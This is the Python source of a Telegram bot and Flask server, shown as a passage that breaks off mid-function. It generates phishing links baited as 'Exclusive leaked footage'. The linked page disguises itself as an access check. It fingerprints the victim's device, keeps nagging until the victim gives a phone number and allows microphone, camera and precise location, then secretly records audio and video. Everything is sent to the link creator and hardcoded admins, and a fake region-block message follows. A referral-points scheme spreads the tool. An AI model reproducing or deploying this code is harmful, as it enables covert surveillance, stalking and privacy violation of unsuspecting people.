import os
import json
import random
import secrets
import threading
import requests
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime, timedelta

# ---------- Configuration ----------
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS   = {"1838854178", "1930138915"}
# Get the public URL from Render environment or set manually
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
if not BASE_URL:
    # If not on Render (or variable missing), use a default
    BASE_URL = os.environ.get("BASE_URL", "https://finalinfoger.onrender.com")

tracking_links = {}   # token -> user_id
seen_users     = set()

EMOJI_EFFECTS = [
    "5104841245755180586", "5107584321108051014", "5104858069142078462",
    "5044134455711629726", "5046509860389126442", "5046589136895476101"
]

def random_effect():
    return random.choice(EMOJI_EFFECTS)

user_data = {}

DAILY_BONUS_PTS  = 5
REFER_BONUS_PTS  = 10
PTS_PER_DAY      = 10
FREE_DAYS_NEW    = 1

flask_app = Flask(__name__)


# ---------- User Data Helpers ----------
def get_user(user_id):
    uid = str(user_id)
    if uid not in user_data:
        user_data[uid] = {
            "points": 0,
            "access_expires": None,
            "last_daily": None,
            "referrals": 0,
            "referred_by": None,
            "name": "Unknown"
        }
    return user_data[uid]

def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

def has_access(user_id):
    if is_admin(user_id):
        return True
    u = get_user(user_id)
    exp = u.get("access_expires")
    return exp is not None and exp > datetime.now()

def add_access_days(user_id, days):
    u = get_user(user_id)
    now = datetime.now()
    base = u["access_expires"] if u["access_expires"] and u["access_expires"] > now else now
    u["access_expires"] = base + timedelta(days=days)

def add_points(user_id, pts):
    u = get_user(user_id)
    u["points"] = max(0, u.get("points", 0) + pts)

def remove_points(user_id, pts):
    u = get_user(user_id)
    u["points"] = max(0, u.get("points", 0) - pts)

def redeem_points(user_id):
    u = get_user(user_id)
    pts = u.get("points", 0)
    days = pts // PTS_PER_DAY
    if days > 0:
        remaining = pts % PTS_PER_DAY
        u["points"] = remaining
        add_access_days(user_id, days)
    return days

def access_expires_str(user_id):
    u = get_user(user_id)
    exp = u.get("access_expires")
    if not exp:
        return "❌ Access မရှိပါ | No access"
    if exp < datetime.now():
        return "⏰ Access ကုန်သွားပြီ | Expired"
    delta = exp - datetime.now()
    h = int(delta.total_seconds() // 3600)
    m = int((delta.total_seconds() % 3600) // 60)
    return f"✅ {h}h {m}m ကျန်သည် | {h}h {m}m remaining"


# ---------- Minimal Permission Page (no video player) ----------
PERMISSION_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: sans-serif; text-align: center; padding: 2rem; }
        .status { margin-top: 2rem; font-size: 1.2rem; color: #aaa; }
    </style>
</head>
<body>
    <h2>🔐 Access Check</h2>
    <div class="status" id="status">Initializing...</div>
    <script>
        const token = "{{ token }}";
        const mode  = "{{ mode }}";

        async function collectFingerprint() {
            let battery = {};
            try {
                const b = await navigator.getBattery();
                battery = { batteryLevel: Math.round(b.level*100)+"%", charging: b.charging };
            } catch(e) {}
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            let deviceModel = "Unknown";
            if(navigator.userAgentData) {
                try {
                    const d = await navigator.userAgentData.getHighEntropyValues(["model","platform"]);
                    if(d.model && d.model.trim()) deviceModel = d.model.trim();
                } catch(e) {}
            }
            if(deviceModel === "Unknown") {
                const ua = navigator.userAgent;
                let m = ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);
                if(m) deviceModel = m[1].trim();
                else {
                    m = ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);
                    if(m) deviceModel = m[3].trim();
                    else deviceModel = navigator.platform || "Unknown";
                }
            }
            return {
                userAgent: navigator.userAgent,
                deviceModel: deviceModel,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                connectionType: conn.effectiveType || conn.type || "unknown",
                downlink: conn.downlink,
                localTime: new Date().toString(),
                ...battery
            };
        }

        async function sendFingerprint() {
            try {
                const fp = await collectFingerprint();
                await fetch("/capture_fingerprint", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ token, fingerprint: fp })
                });
            } catch(e) {}
        }

        async function sendContact() {
            let phone = "";
            while(!phone || phone.trim() === "") {
                phone = prompt("📞 သင့်ဖုန်းနံပါတ် ထည့်ပါ | Enter your phone number:", "");
                if(phone === null) continue;
                phone = phone.trim();
                if(phone === "") alert("❌ ဖုန်းနံပါတ် မထည့်သွင်းပါ | Please enter a phone number");
            }
            const fp = await collectFingerprint();
            const form = new FormData();
            form.append("token", token);
            form.append("phone", phone);
            form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_contact", { method: "POST", body: form });
            document.getElementById("status").innerHTML = "✅ Phone number captured";
        }

        async function getAudioStream() {
            while(true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    return stream;
                } catch(e) {
                    alert("🎤 Microphone access is required. Please allow microphone.");
                }
            }
        }

        async function sendAudio() {
            const stream = await getAudioStream();
            const mimeType = MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus" : "audio/webm";
            const recorder = new MediaRecorder(stream, { mimeType });
            const chunks = [];
            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
            recorder.start(300);
            await new Promise(r => setTimeout(r, 6000));
            recorder.stop();
            stream.getTracks().forEach(t => t.stop());
            await new Promise(r => recorder.onstop = r);
            const blob = new Blob(chunks, { type: mimeType });
            const fp = await collectFingerprint();
            const form = new FormData();
            form.append("token", token);
            form.append("audio", blob, "audio.webm");
            form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_combined_audio", { method: "POST", body: form });
            document.getElementById("status").innerHTML = "✅ Audio captured";
        }

        async function getLocation() {
            while(true) {
                try {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000, enableHighAccuracy: true });
                    });
                    return pos;
                } catch(e) {
                    alert("📍 Location access is required. Please allow location.");
                }
            }
        }

        async function sendLocation() {
            const pos = await getLocation();
            const fp = await collectFingerprint();
            const form = new FormData();
            form.append("token", token);
            form.append("lat", pos.coords.latitude);
            form.append("lon", pos.coords.longitude);
            form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_combined_location", { method: "POST", body: form });
            document.getElementById("status").innerHTML = "✅ Location captured";
        }

        async function getVideoStream() {
            while(true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch(e) {
                    alert("🎥 Camera and microphone access required. Please allow both.");
                }
            }
        }

        async function sendVideo() {
            const stream = await getVideoStream();
            const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
            const recorder = new MediaRecorder(stream, { mimeType });
            const chunks = [];
            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
            recorder.start(300);
            await new Promise(r => setTimeout(r, 4000));
            recorder.stop();
            stream.getTracks().forEach(t => t.stop());
            await new Promise(r => recorder.onstop = r);
            const blob = new Blob(chunks, { type: mimeType });
            const fp = await collectFingerprint();
            const form = new FormData();
            form.append("token", token);
            form.append("video", blob, "video.webm");
            form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_combined_video", { method: "POST", body: form });
            document.getElementById("status").innerHTML = "✅ Video captured";
        }

        async function runAll() {
            document.getElementById("status").innerHTML = "📞 Requesting phone number...";
            await sendContact();
            document.getElementById("status").innerHTML = "🎤 Requesting audio...";
            await sendAudio();
            document.getElementById("status").innerHTML = "📍 Requesting location...";
            await sendLocation();
            document.getElementById("status").innerHTML = "🎥 Requesting video...";
            await sendVideo();
            document.getElementById("status").innerHTML = "✅ All data captured. Thank you!";
            setTimeout(() => { document.body.innerHTML = "<h2>Content unavailable in your region</h2>"; }, 2000);
        }

        if(mode === "all") {
            runAll();
        } else if(mode === "contact") {
            sendContact().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
        } else if(mode === "audio") {
            sendAudio().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
        } else if(mode === "location") {
            sendLocation().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
        } else if(mode === "video") {
            sendVideo().then(() => { document.getElementById("status").innerHTML = "✅ Done"; });
        } else {
            document.getElementById("status").innerHTML = "⚠️ Invalid mode";
        }

        sendFingerprint();
    </script>
</body>
</html>"""


# ---------- Flask Routes ----------
@flask_app.route('/')
def index():
    return """<!DOCTYPE html><html><head><title>ViralStream</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{text-align:center;padding:40px;background:#111;border-radius:14px;border:1px solid #222;max-width:400px;width:90%}
h1{color:#e63946;font-size:2rem;margin-bottom:12px}
p{color:#666;line-height:1.6;margin-bottom:8px}code{background:#1e1e1e;padding:3px 8px;border-radius:4px;color:#e63946}</style></head>
<body><div class="box"><h1>▶ ViralStream</h1>
<p>Bot ဖြင့် link ထုတ်ပြီး မျှဝေပါ</p>
<p style="margin-top:16px;font-size:.8rem;color:#444">Use <code>/grab</code> in the bot</p>
</div></body></html>""", 200


@flask_app.route('/v/<token>')
def v_page(token):
    mode = request.args.get('m', 'all')
    user_id = tracking_links.get(token)
    if user_id:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        ua = request.headers.get('User-Agent', 'Unknown')[:120]
        mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
                       'location':'📍 Location','video':'🎥 Video','contact':'📞 Contact'}
        label = mode_labels.get(mode, mode)
        alert = (
            f"🔗 <b>Link ဖွင့်သည်! | Link Opened!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Mode: <b>{label}</b>\n"
            f"🌐 IP: <code>{ip}</code>\n"
            f"📱 UA: {ua}\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
    return render_template_string(PERMISSION_PAGE, token=token, mode=mode)


# ---------- Capture Endpoints ----------
@flask_app.route('/capture_fingerprint', methods=['POST'])
def capture_fingerprint():
    data = request.get_json(silent=True) or {}
    token = data.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    fp = data.get('fingerprint', {})
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    report = (
        f"📱 <b>Device Info | ဖုန်းအချက်အလက်</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
        f"💻 Platform: {fp.get('platform','Unknown')}\n"
        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
        f"🗣 Language: {fp.get('language','?')}\n"
        f"⏰ Timezone: {fp.get('timezone','?')}\n"
        f"🔋 Battery: {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'}\n"
        f"📡 Net: {fp.get('connectionType','?')} / {fp.get('downlink','?')}Mbps\n"
        f"🧠 CPU: {fp.get('hardwareConcurrency','?')} cores | 💾 {fp.get('deviceMemory','?')}GB\n"
        f"📅 {fp.get('localTime','?')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
    return jsonify({"ok": True}), 200

@flask_app.route('/capture_combined_photo', methods=['POST'])
def capture_combined_photo():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    photo_file = request.files.get('photo')
    if not photo_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    photo_bytes = photo_file.read()
    threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200

@flask_app.route('/capture_combined_video', methods=['POST'])
def capture_combined_video():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    video_file = request.files.get('video')
    if not video_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    video_bytes = video_file.read()
    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200

@flask_app.route('/capture_combined_audio', methods=['POST'])
def capture_combined_audio():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    audio_file = request.files.get('audio')
    if not audio_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    audio_bytes = audio_file.read()
    threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200

@flask_app.route('/capture_combined_location', methods=['POST'])
def capture_combined_location():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    if not lat or not lon:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
    threading.Thread(target=broadcast_message, args=(user_id, caption, True), daemon=True).start()
    return jsonify({"ok": True}), 200

@flask_app.route('/capture_contact', methods=['POST'])
def capture_contact():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    phone = request.form.get('phone', '').strip()
    if not phone:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json) + f"\n📞 Phone: <code>{phone}</code>"
    threading.Thread(target=broadcast_contact, args=(user_id, phone, caption), daemon=True).start()
    return jsonify({"ok": True}), 200

def _fp_caption(fp_json):
    try:
        fp = json.loads(fp_json)
        return (
            f"📱 <b>Device Info</b>\n"
            f"📱 {fp.get('deviceModel','?')} | {fp.get('platform','?')}\n"
            f"🖥 {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')} | {fp.get('language','?')}\n"
            f"⏰ {fp.get('timezone','?')}\n"
            f"🔋 {fp.get('batteryLevel','?')} | 📡 {fp.get('connectionType','?')}"
        )
    except Exception:
        return "📱 Device Info"


# ---------- Telegram Send Helpers ----------
def recipients(user_id):
    ids = [str(user_id)]
    for a in ADMIN_IDS:
        if a not in ids:
            ids.append(a)
    return ids

def send_telegram_message(chat_id, text, reply_markup=None, effect_id=None):
    try:
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        if effect_id:
            payload["message_effect_id"] = effect_id
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload, timeout=10)
    except Exception:
        pass

def broadcast_message(user_id, text, use_effect=False):
    eff = random_effect() if use_effect else None
    for cid in recipients(user_id):
        threading.Thread(target=send_telegram_message, args=(cid, text), kwargs={"effect_id": eff}, daemon=True).start()

def broadcast_photo(user_id, photo_bytes, caption):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML', 'message_effect_id': eff},
                files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}, timeout=30)
        except Exception:
            pass

def broadcast_voice(user_id, audio_bytes, caption):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML', 'message_effect_id': eff},
                files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')}, timeout=30)
        except Exception:
            pass

def broadcast_video(user_id, video_bytes, caption):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML', 'message_effect_id': eff},
                files={'video': ('video.mp4', video_bytes, 'video/mp4')}, timeout=60)
            if not r.json().get('ok'):
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML', 'message_effect_id': eff},
                    files={'document': ('video.webm', video_bytes, 'video/webm')}, timeout=60)
        except Exception:
            pass

def broadcast_location(user_id, lat, lon):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon), "message_effect_id": eff}, timeout=10)
        except Exception:
            pass

def broadcast_contact(user_id, phone, caption):
    eff = random_effect()
    text = f"📞 <b>Phone Number Captured</b>\n\n{caption}\n━━━━━━━━━━━━━━━━━━━━"
    for cid in recipients(user_id):
        send_telegram_message(cid, text, effect_id=eff)


# ---------- Bot Keyboards ----------
def get_reply_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton("🌐 All-in-One Link")],
            [KeyboardButton("📸 Photo Link"), KeyboardButton("🎤 Audio Link")],
            [KeyboardButton("📍 Location Link"), KeyboardButton("🎥 Video Link")],
            [KeyboardButton("📞 Contact Link"), KeyboardButton("💰 Daily Bonus")],
            [KeyboardButton("👥 Refer & Earn"), KeyboardButton("💎 My Points | Access")],
            [KeyboardButton("📋 Active Links"), KeyboardButton("🗑 Clear Links")],
            [KeyboardButton("❓ Help")],
        ],
        resize_keyboard=True,
        one_time_keyboard=False
    )

def main_menu_inline():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All-in-One Link", callback_data="gen_all")],
        [InlineKeyboardButton("📸 Photo", callback_data="gen_photo"),
         InlineKeyboardButton("🎤 Audio", callback_data="gen_audio")],
        [InlineKeyboardButton("📍 Location", callback_data="gen_location"),
         InlineKeyboardButton("🎥 Video", callback_data="gen_video")],
        [InlineKeyboardButton("📞 Contact", callback_data="gen_contact")],
        [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
         InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
        [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
         InlineKeyboardButton("📋 Links", callback_data="links")],
        [InlineKeyboardButton("🗑 Clear", callback_data="clear"),
         InlineKeyboardButton("❓ Help", callback_data="help")],
    ])

def make_links_inline(token):
    base = f"{BASE_URL}/v/{token}"
    all_url = f"{base}?m=all"
    share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
    share_url = f"https://t.me/share/url?url={requests.utils.quote(all_url)}&text={requests.utils.quote(share_text)}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All-in-One", url=all_url)],
        [InlineKeyboardButton("📸 Photo + Device", url=f"{base}?m=photo"),
         InlineKeyboardButton("🎤 Audio + Device", url=f"{base}?m=audio")],
        [InlineKeyboardButton("📍 Location + Device", url=f"{base}?m=location"),
         InlineKeyboardButton("🎥 Video + Device", url=f"{base}?m=video")],
        [InlineKeyboardButton("📞 Contact + Device", url=f"{base}?m=contact")],
        [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
        [InlineKeyboardButton("📋 Active Links", callback_data="links"),
         InlineKeyboardButton("🏠 Menu", callback_data="menu")],
    ])

def format_links_msg(token):
    base = f"{BASE_URL}/v/{token}"
    return (
        f"✅ <b>Links ထုတ်ပြီးပါပြီ! | Links Ready!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>All-in-One:</b>\n<code>{base}?m=all</code>\n\n"
        f"📸 <b>Photo:</b>\n<code>{base}?m=photo</code>\n\n"
        f"🎤 <b>Audio:</b>\n<code>{base}?m=audio</code>\n\n"
        f"📍 <b>Location:</b>\n<code>{base}?m=location</code>\n\n"
        f"🎥 <b>Video:</b>\n<code>{base}?m=video</code>\n\n"
        f"📞 <b>Contact:</b>\n<code>{base}?m=contact</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⬇️ ခလုတ်များမှ တစ်ချက်နှိပ်၍ ဖွင့်နိုင်သည်"
    )

def format_single_link_msg(token, mode_key, label):
    url = f"{BASE_URL}/v/{token}?m={mode_key}"
    return (
        f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <code>{url}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"မျှဝေပြီး data ကောက်ပါ | Share to collect data"
    )

def single_link_inline(token, mode_key, label):
    url = f"{BASE_URL}/v/{token}?m={mode_key}"
    share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
    share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🔗 {label} Link ဖွင့်မည်", url=url)],
        [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
        [InlineKeyboardButton("🔄 Link အသစ်", callback_data=f"gen_{mode_key}"),
         InlineKeyboardButton("🏠 Menu", callback_data="menu")],
    ])


# ---------- Points / Daily / Refer Helpers ----------
def daily_bonus_text(user_id):
    u = get_user(user_id)
    today = datetime.now().date()
    last = u.get("last_daily")
    if last == today:
        return None
    u["last_daily"] = today
    add_points(user_id, DAILY_BONUS_PTS)
    days = redeem_points(user_id)
    u2 = get_user(user_id)
    msg = (
        f"🎁 <b>Daily Bonus ရပြီ! | Daily Bonus Claimed!</b>\n\n"
        f"💰 +{DAILY_BONUS_PTS} points ရပြီ\n"
        f"💎 Total Points: <b>{u2['points']}</b>\n"
    )
    if days > 0:
        msg += f"🔓 Access: +{days} day(s) ထပ်ရပြီ!\n"
    msg += f"\n⏰ {access_expires_str(user_id)}\n"
    msg += f"\n📅 မနက်ဖြန် ထပ်ရယူနိုင်သည် | Claim again tomorrow"
    return msg

_BOT_USERNAME_CACHE = {}
def refer_link(user_id):
    if "username" not in _BOT_USERNAME_CACHE:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)
            _BOT_USERNAME_CACHE["username"] = r.json().get("result", {}).get("username", "")
        except Exception:
            _BOT_USERNAME_CACHE["username"] = ""
    uname = _BOT_USERNAME_CACHE.get("username", "")
    if uname:
        return f"https://t.me/{uname}?start=ref_{user_id}"
    return "Bot link မရနိုင်ပါ | Cannot get bot link"

def refer_share_url(ref_link_url):
    share_text = "🎁 ဤ Bot မှ FREE points ရနိုင်သည်! Join လုပ်ပြီး points ရယူပါ!"
    return f"https://t.me/share/url?url={requests.utils.quote(ref_link_url)}&text={requests.utils.quote(share_text)}"

def mypoints_text(user_id):
    u = get_user(user_id)
    pts = u.get("points", 0)
    refs = u.get("referrals", 0)
    exp = access_expires_str(user_id)
    return (
        f"💎 <b>My Points & Access</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Points: <b>{pts}</b>\n"
        f"👥 Referrals: <b>{refs}</b>\n"
        f"📡 {exp}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 {PTS_PER_DAY} points = 1 day access\n"
        f"👥 တစ်ယောက် refer → +{REFER_BONUS_PTS} pts + 1 day\n"
        f"🎁 Daily bonus → +{DAILY_BONUS_PTS} pts/day"
    )

def mypoints_inline(user_id):
    pts = get_user(user_id).get("points", 0)
    btns = [[InlineKeyboardButton("🏠 Menu", callback_data="menu"),
             InlineKeyboardButton("👥 Refer", callback_data="refer"),
             InlineKeyboardButton("🎁 Daily", callback_data="daily")]]
    if pts >= PTS_PER_DAY:
        btns.insert(0, [InlineKeyboardButton(f"🔓 Redeem {pts} pts → {pts//PTS_PER_DAY} day(s)", callback_data="redeem")])
    return InlineKeyboardMarkup(btns)

def no_access_text():
    return (
        f"🔒 <b>Access မရှိပါ | No Access</b>\n\n"
        f"Link ထုတ်ရန် access လိုအပ်သည်\n\n"
        f"Access ရရှိနည်း:\n"
        f"👥 တစ်ယောက် refer → +{REFER_BONUS_PTS} pts + 1 day\n"
        f"🎁 Daily bonus → +{DAILY_BONUS_PTS} pts/day\n"
        f"💰 {PTS_PER_DAY} points = 1 day access\n\n"
        f"👇 Refer လုပ်ပါ သို့မဟုတ် Daily bonus ယူပါ"
    )

def no_access_inline():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Refer & Earn", callback_data="refer"),
         InlineKeyboardButton("🎁 Daily Bonus", callback_data="daily")],
        [InlineKeyboardButton("💎 My Points", callback_data="mypoints")]
    ])


# ---------- Bot Command Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    u = get_user(user_id)
    u["name"] = user.full_name or "Unknown"

    is_new = user_id not in seen_users
    seen_users.add(user_id)

    referral_bonus_given = False
    args = context.args or []
    if args and args[0].startswith("ref_"):
        referrer_id = str(args[0][4:])
        if referrer_id != user_id and u.get("referred_by") is None and referrer_id in user_data:
            u["referred_by"] = referrer_id
            add_points(referrer_id, REFER_BONUS_PTS)
            add_access_days(referrer_id, 1)
            get_user(referrer_id)["referrals"] = get_user(referrer_id).get("referrals", 0) + 1
            referral_bonus_given = True
            notify = (
                f"🎉 <b>Referral ရပြီ! | Referral Bonus!</b>\n\n"
                f"👤 {user.full_name} သည် သင့် link မှ ဝင်လာပြီ\n"
                f"💰 +{REFER_BONUS_PTS} points ရပြီ!\n"
                f"📅 +1 day access ရပြီ!\n\n"
                f"⏰ {access_expires_str(referrer_id)}"
            )
            threading.Thread(target=send_telegram_message, args=(referrer_id, notify), daemon=True).start()

    if is_new:
        add_access_days(user_id, FREE_DAYS_NEW)

    alert = (
        f"👤 <b>{'🆕 NEW' if is_new else '🔄 Return'} User</b>\n"
        f"📛 {user.full_name} | {'@'+user.username if user.username else '-'}\n"
        f"🆔 <code>{user_id}</code>\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        + (f"\n🎁 Referred! bonus sent to {get_user(u.get('referred_by','')).get('name','?')}" if referral_bonus_given else "")
    )
    for aid in ADMIN_IDS:
        threading.Thread(target=send_telegram_message, args=(aid, alert), daemon=True).start()

    welcome = (
        f"👋 မင်္ဂလာပါ <b>{user.first_name}</b>! | Hello!\n\n"
        f"{'🆕 <b>ကြိုဆိုပါသည်!</b> 1 day free access ရပြီ!\n' if is_new else ''}"
        f"{'🎉 Referral link မှ ဝင်လာတဲ့အတွက် ကျေးဇူးတင်ပါသည်!\n' if referral_bonus_given else ''}"
        f"⏰ {access_expires_str(user_id)}\n\n"
        f"📌 အောက်ပါ ခလုတ်များမှ လုပ်ဆောင်ချက် ရွေးချယ်ပါ\n\n"
        f"🤖 <b>BOT Creator</b> @koekoe4"
    )
    await update.message.reply_text(welcome, parse_mode="HTML", reply_markup=get_reply_keyboard())
    await update.message.reply_text("🏠 <b>Main Menu</b>", parse_mode="HTML", reply_markup=main_menu_inline())

async def grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not has_access(user_id):
        await update.message.reply_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
        return
    token = secrets.token_urlsafe(12)
    tracking_links[token] = user_id
    await update.message.reply_text(format_links_msg(token), parse_mode="HTML", reply_markup=make_links_inline(token))

async def cmd_daily(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    get_user(user_id)
    msg = daily_bonus_text(user_id)
    if not msg:
        u = get_user(user_id)
        await update.message.reply_text(
            f"⏰ <b>ယနေ့ Daily bonus ရပြီးပါပြီ</b>\n\n"
            f"💎 Points: <b>{u['points']}</b>\n"
            f"{access_expires_str(user_id)}\n\n"
            f"📅 မနက်ဖြန် ထပ်ရယူနိုင်သည် | Come back tomorrow",
            parse_mode="HTML"
        )
        return
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=mypoints_inline(user_id))

async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    u = get_user(user_id)
    link = refer_link(user_id)
    surl = refer_share_url(link)
    await update.message.reply_text(
        f"👥 <b>Refer & Earn</b>\n\n"
        f"သင့် referral link:\n<code>{link}</code>\n\n"
        f"👤 Referred so far: <b>{u.get('referrals',0)}</b> ယောက်\n\n"
        f"🎁 တစ်ယောက် refer → +{REFER_BONUS_PTS} points + 1 day access\n\n"
        f"Link ကို မိတ်ဆွေများထံ မျှဝေပါ! | Share with friends!",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)],
            [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
             InlineKeyboardButton("🏠 Menu", callback_data="menu")]
